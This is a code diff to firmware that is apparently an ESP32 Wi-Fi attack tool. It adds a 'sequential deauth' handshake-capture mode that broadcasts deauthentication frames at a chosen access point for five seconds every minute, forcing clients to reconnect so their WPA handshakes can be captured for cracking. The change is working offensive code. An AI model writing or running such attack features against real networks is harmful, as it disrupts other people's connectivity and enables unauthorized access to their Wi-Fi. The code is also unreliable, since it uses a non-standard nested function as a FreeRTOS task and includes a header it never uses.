@@ -23,6 +23,8 @@
 #include "pcap_serializer.h"
 #include "hccapx_serializer.h"
 
+#include "esp_timer.h"
+
 static const char *TAG = "main:attack_handshake";
 static attack_handshake_methods_t method = -1;
 static const wifi_ap_record_t *ap_record = NULL;
@@ -70,6 +72,36 @@ void attack_handshake_start(attack_config_t *attack_config){
             ESP_LOGD(TAG, "ATTACK_HANDSHAKE_METHOD_PASSIVE");
             // No actions required. Passive handshake capture
             break;
+        case ATTACK_HANDSHAKE_METHOD_SEQUENTIAL_DEAUTH: {
+            ESP_LOGD(TAG, "ATTACK_HANDSHAKE_METHOD_SEQUENTIAL_DEAUTH");
+            // Sequential deauth logic: every 60s, send deauth for 5-10s, then wait for handshake
+            // Use ESP timer for periodic deauth
+            // Removed unused variables seq_deauth_timer and elapsed_time
+            static int time_limit = 0;
+            // Use attack_config.timeout if available, else unlimited
+            if (attack_config->timeout > 0) {
+                time_limit = attack_config->timeout;
+            } else {
+                time_limit = 0; // unlimited
+            }
+            // Use FreeRTOS task for sequential deauth
+            void seq_deauth_task(void *pvParameters) {
+                int elapsed = 0;
+                while (time_limit == 0 || elapsed < time_limit) {
+                    // Send deauth for 5s
+                    attack_method_broadcast(ap_record, 1);
+                    vTaskDelay(5000 / portTICK_PERIOD_MS);
+                    attack_method_broadcast_stop();
+                    // Wait for handshake (remaining 55s)
+                    vTaskDelay(55000 / portTICK_PERIOD_MS);
+                    elapsed += 60;
+                }
+                attack_handshake_stop();
+                vTaskDelete(NULL);
+            }
+            xTaskCreate(seq_deauth_task, "seq_deauth_task", 4096, NULL, 5, NULL);
+            break;
+        }
         default:
             ESP_LOGD(TAG, "Method unknown! Fallback to ATTACK_HANDSHAKE_METHOD_PASSIVE");
     }
